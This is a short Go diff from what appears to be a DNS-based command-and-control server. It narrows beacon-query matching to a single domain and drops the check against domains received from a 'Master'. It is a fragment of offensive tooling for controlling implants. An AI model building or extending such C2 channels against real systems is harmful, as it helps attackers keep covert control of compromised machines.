@@ -1684,17 +1684,7 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, bool) {
 	// Check if query matches our domain
 	if !strings.HasSuffix(qname, c2.domain) {
-		// Also check known domains from Master
-		matched := false
-		for _, d := range c2.knownDomains {
-			if strings.HasSuffix(qname, d) {
-				matched = true
-				break
-			}
-		}
-		if !matched {
-			return "", false
-		}
+		return "", false
 	}
 
 	// Extract payload (subdomain)
